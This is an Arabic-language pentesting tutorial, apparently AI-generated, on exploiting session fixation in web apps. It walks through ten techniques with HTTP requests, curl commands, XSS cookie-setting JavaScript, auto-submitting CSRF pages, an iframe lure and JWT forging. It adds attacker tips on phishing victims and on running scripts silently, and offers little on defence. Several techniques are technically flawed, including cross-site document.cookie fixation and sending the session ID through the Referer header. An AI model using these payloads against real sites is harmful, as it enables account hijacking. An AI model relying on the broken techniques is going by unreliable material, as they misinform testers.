
# 🛠️ الخطوات العملية لاختبار واستغلال Session Fixation

### ⚙️ مرحلة الاستكشاف: هل التطبيق عرضة لل(Session Fixation)؟

#### 1. **أول طلب: الحصول على جلسة جديدة**
```http
GET /login HTTP/1.1
Host: target.com
```
الخادم يرد:
```http
Set-Cookie: sessionid=abc123; Path=/; HttpOnly
```

#### 2. **تبدأ اختبار الإصلاح (Fixation)**
- تغير الـ `sessionid` إلى قيمة معروفة:
```http
GET /login HTTP/1.1
Host: target.com
Cookie: sessionid=hacker_session
```

#### 3. **تطلب من الضحية أن تسجل دخول باستخدام نفس التوكن**
- إما عن طريق:
  - Social Engineering (رابط به كوكيز محدد)
  - Cross-Site Request (من موقع آخر)
  - Phishing Page تضبط الكوكيز قبل submit البيانات

#### 4. **الضحية تسجل دخول...**
- الخادم لا يولد جلسة جديدة → يستخدم نفس `hacker_session`.

#### 5. **أنت (المُخترق) تفتح الموقع بنفس الجلسة**
```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: sessionid=hacker_session
```

➡️ إذا كانت لديك **وصول إلى حساب الضحية** → ثغرة موجودة ✅

---

# 🧪 محاولات مختلفة لاختبار Session Fixation
فَهَمْتُك تمام ✅  
فيما يلي شرح **تفصيلي لكل محاولة من المحاولات العشرة** لاختبار واستغلال ثغرة **Session Fixation** في اختبار الإختراق، مع أمثلة وتفاصيل فنية تساعدك كـ pentester على تنفيذها عمليًا.

---

## 🔥 Session Fixation - 10 محاولات تفصيلية

---

### 🧪 المحاولة #1: وضع Session ID في الكوكيز (Cookie)

#### 📌 الفكرة:
الخادم لا يرفض أو يعيد إنشاء Session ID إذا تم تحديده مسبقًا. يمكنك فقط تعديل الـ Cookie قبل تسجيل الدخول.

#### ⚙️ الخطوات:
1. ابدأ باستخدام Burp Suite Proxy.
2. اطلب صفحة `GET /login` بدون تسجيل دخول.
3. راقب Response → إذا حصلت على `Set-Cookie`.
4. غير القيمة يدويًا في Request:
```http
GET /login HTTP/1.1
Host: target.com
Cookie: sessionid=hacker_session
```
5. أرسل طلب تسجيل الدخول بنفس الـ Cookie.
6. لو الجلسة الجديدة ما تغيّرتش → ثغرة موجودة.

#### 🛠️ الأداة:
- **Burp Proxy**
- **EditThisCookie Extension**

#### 💡 نصيحة:
استخدم **Burp Macros** لتتبع التغيرات في الجلسات تلقائيًا.

---

### 🧪 المحاولة #2: Session ID في URL Parameter

#### 📌 الفكرة:
بعض التطبيقات تمرر Session ID في الرابط، مثل:
```
https://target.com/login?sessionid=hacker_session
```

#### ⚙️ الخطوات:
1. جرب زيارة الرابط المذكور.
2. سجّل دخول عبر الصفحة.
3. استخدم نفس الرابط أو كوكيز للوصول مرة أخرى.
4. لو الجلسة ما تغيّرش → Session Fixation مجربة.

#### 🛠️ الأداة:
- **Burp Repeater**
- **Custom Links in Phishing Emails**

#### 💡 مشكلة:
سهولة تسريب Session ID عبر Referer Headers أو Browser History.

---

### 🧪 المحاولة #3: استخدام Hidden Input في Form

#### 📌 الفكرة:
بعض النماذج HTML قد تحتوي على Session ID داخل `<input type="hidden">`.

#### ⚙️ الخطوات:
1. احصل على نموذج تسجيل الدخول:
```html
<form action="/login" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="hidden" name="token" value="abc123">
</form>
```
2. غيّر قيمة `token` إلى Session ID مرغوب فيه:
```html
<input type="hidden" name="token" value="hacker_session">
```
3. أرسل النموذج بعد التعديل.

#### 🛠️ الأداة:
- **HTML Editor**
- **Browser DevTools**

#### 💡 نصيحة:
يمكن استخدام خدمة مثل Pastebin لاستضافة النموذج المعدل وإرساله للضحية.

---

### 🧪 المحاولة #4: استخدام JavaScript لتغيير الكوكيز

#### 📌 الفكرة:
إذا التطبيق لا يستخدم HttpOnly على الكوكيز، يمكن تعديل الـ Session ID عبر JavaScript.

#### ⚙️ الخطوات:
1. قم بتنفيذ أي ثغرة XSS في الموقع.
2. ضع كود JS لتغيير الكوكيز:
```javascript
document.cookie = "PHPSESSID=hacker_session; path=/";
```
3. اجعل الضحية تقوم بتسجيل الدخول وهو يستخدم هذا التوكن.

#### 🛠️ الأداة:
- **XSS payloads**
- **BeEF Framework**

#### 💡 نصيحة:
استخدم onload أو onmouseover events لتشغيل الكود بصمت.

---

### 🧪 المحاولة #5: استخدام Redirect من موقع طرف ثالث

#### 📌 الفكرة:
إنشاء صفحة خارجية تعيد توجيه المستخدم إلى التطبيق مع Session ID بالفعل.

#### ⚙️ الخطوات:
1. إنشاء صفحة HTML بسيطة:
```html
<html>
  <body>
    <iframe src="https://target.com/login?sessionid=hacker_session"></iframe>
  </body>
</html>
```
2. إرسال الرابط للضحية.
3. عند تسجيل الدخول، الجلسة ستكون باسم `hacker_session`.

#### 🛠️ الأداة:
- **HTML Host Server**
- **Phishing Email or Social Engineering**

#### 💡 نصيحة:
استخدم أيضًا `<img>` أو `<script>` tags لإرسال Session ID بشكل أقل وضوحًا.

---

### 🧪 المحاولة #6: استخدام Cross-Site Request (CSRF) + Session Fixation

#### 📌 الفكرة:
دمج CSRF مع Session Fixation لتجهيز الجلسة وتسبب تسجيل الدخول عن بعد.

#### ⚙️ الخطوات:
1. إنشاء صفحة HTML بها نموذج POST:
```html
<form action="https://target.com/login" method="POST" id="auto">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="password" value="pass123">
</form>

<script>
  document.cookie = "PHPSESSID=hacker_session; path=/";
  document.getElementById("auto").submit();
</script>
```
2. إرسال الرابط للضحية → يتم تسجيل الدخول بجلسة معينة.

#### 🛠️ الأداة:
- **BeEF**
- **Burp CSRF PoC Generator**

#### 💡 نصيحة:
تأكد من أن الخادم لا يستخدم Anti-CSRF tokens.

---

### 🧪 المحاولة #7: استخدام Flash أو Silverlight لإرسال كوكيز محددة

#### 📌 الفكرة:
بعض التطبيقات القديمة تستخدم Flash/Silverlight، والتي يمكنها إرسال كوكيز مخصصة.

#### ⚙️ الخطوات:
1. إنشاء ملف SWF يستخدم `navigateToURL` لفتح صفحة login.
2. تعديل header لتحديد Session ID.
3. إرسال الرابط للضحية.

#### 🛠️ الأداة:
- Adobe Flex SDK
- Burp Collaborator (للتتبع)

#### 💡 ملاحظة:
هذه الطريقة قديمة لكنها قد تكون فعّالة ضد أنظمة Legacy.

---

### 🧪 المحاولة #8: استخدام Referer Header لتمرير القيمة

#### 📌 الفكرة:
بعض التطبيقات تستخرج Session ID من Referer Header.

#### ⚙️ الخطوات:
1. إنشاء صفحة تحتوي على:
```html
<a href="https://target.com/login">Click here to login</a>
```
2. تعديل الرابط ليحتوي على Referer يحتوي على Session ID:
```bash
curl -H "Referer: https://attacker.com/?sessionid=hacker_session" https://target.com/login
```
3. لو الخادم يقرأ من referer → الجلسة تتغير.

#### 🛠️ الأداة:
- **cURL**
- **Burp Intruder**

#### 💡 نصيحة:
استخدم extensions مخصصة لتغيير Referer بسهولة.

---

### 🧪 المحاولة #9: استخدام API Endpoints Directly

#### 📌 الفكرة:
تطبيقات RESTful قد تقبل Session ID في header أو Query Param.

#### ⚙️ الخطوات:
1. استخدام Postman أو cURL:
```bash
curl -X POST https://api.target.com/login \
     -H "Authorization: Bearer hacker_session" \
     -d '{"username": "admin", "password": "pass"}'
```
2. لو سمحت بتغيير الجلسة أو استخدام توكن محدد → ثغرة موجودة.

#### 🛠️ الأداة:
- **Postman**
- **Swagger UI (إذا كان مفتوح)**

#### 💡 نصيحة:
جرّب استخدام JWT Token معدّل إذا كنت تتعامل مع OAuth أو Tokens.

---

### 🧪 المحاولة #10: استخدام Login Bypass عبر JWT Token

#### 📌 الفكرة:
بعض التطبيقات تستخدم JWT ك	Session Token ويمكن تعديل payload.

#### ⚙️ الخطوات:
1. الحصول على JWT من تسجيل دخول عادي.
2. فتحه باستخدام jwt.io أو JWT Editor في Burp.
3. تعديل payload لتحديد user_id أو role:
```json
{
  "user": "admin",
  "session": "hacker_session"
}
```
4. إعادة توقيعه (Sign) إنترنت باستخدام secret معرف أو Brute-force.
5. استخدام التوكن الجديد للدخول كمسؤول.

#### 🛠️ الأداة:
- **JWT Editor (Burp Extension)**
- **john the ripper** – لكسر التوقيع

#### 💡 نصيحة:
بعض التطبيقات تستخدم `"alg": "none"` مما يسمح بإعادة استخدام التوكن دون توقيع.

---

# ✨ خلاصة:

| المحاولة | متى تستخدمها؟ |
|---------|----------------|
| 1. Cookie | عندما يكون Session ID في الكوكيز |
| 2. URL Param | عندما ينقل التوكن في الرابط |
| 3. Hidden Input | في HTML Forms |
| 4. JS | مع XSS بدون HttpOnly |
| 5. Redirect | لجذب الضحية عبر رابط خارجي |
| 6. CSRF | مع عدم وجود حماية ضد CSRF |
| 7. Flash | في أنظمة Legacy |
| 8. Referer | إذا كانت الجلسة تُستخرج من referer |
| 9. REST API | في الخدمات المبنية على API |
| 10. JWT | في أنظمة OAuth/Tokens |

---

# 🧩 أدوات Pentesting لاختبار Session Fixation

| الأداة | الوظيفة |
|--------|----------|
| **Burp Suite** | تعديل الطلبات، التقاط الكوكيز، إعادة الاستخدام |
| **Cookie Manager Extensions** | تعديل الكوكيز مباشرة في المتصفح |
| **Postman** | إرسال طلبات يدوية مع Session ID محدد |
| **cURL** | سكريبت سريع لاختبار التوكن |
| **XSS payloads** | تغيير الكوكيز من خلال JavaScript |
| **HTML POC page** | صفحة بسيطة لإجبار المستخدم على استخدام Session ID معين |

---

# 📌 أمثلة عملية على التنفيذ

### مثال 1: استخدام Session ID في كوكيز

```http
GET /login HTTP/1.1
Host: vulnerable.com
Cookie: PHPSESSID=hacker_session
```

بعدين تسجيل الدخول:

```http
POST /login HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=pass123
```

بعدين تعيد استخدام نفس التوكن:

```http
GET /admin/dashboard HTTP/1.1
Host: vulnerable.com
Cookie: PHPSESSID=hacker_session
```

✅ لو ظهر لك لوحة التحكم → ثغرة موجودة.

---

### مثال 2: استخدام HTML Form لـ CSRF + Session Fixation

```html
<form action="https://vulnerable.com/login" method="POST">
  <input type="hidden" name="username" value="victim">
  <input type="hidden" name="password" value="password123">
</form>

<script>
  document.cookie = "PHPSESSID=hacker_session; path=/";
  document.forms[0].submit();
</script>
```

➡️ لما الضحية تنقر على الرابط، تُرسل الطلب بجلسة معينة → يمكنك الوصول بها.

---

### مثال 3: استخدام cURL لتحديث الجلسة

```bash
curl -b "PHPSESSID=hacker_session" -d "username=admin&password=pass123" https://vulnerable.com/login
```

بعدين تستخدم نفس التوكن في طلب جديد:

```bash
curl -b "PHPSESSID=hacker_session" https://vulnerable.com/admin
```

---

# 🧭 ء Checklist: هل الـ Session Fixation مجربة وناجحة؟

| الشيفرة | النتيجة |
|--------|---------|
| تقدر تعيّن Session ID قبل login | ✅ |
| الـ Session ID ما يتغيّرش بعد login | ✅ |
| تقدر تستخدم نفس التوكن لدخول الحساب | ✅ |
| الـ Session متصلة بالمستخدم المصادق عليه | ✅ |

---

# 🛡️ كيف تعرف أنه معمول لها حماية؟

- الخادم **يُعيد إنشاء الجلسة عند تسجيل الدخول**.
- يتم تجاهل أي Session ID مدخل مسبقًا.
- الـ Session ID مش بناءً على ما يدخله المستخدم → بل يتم توليده عشوائيًا.

---

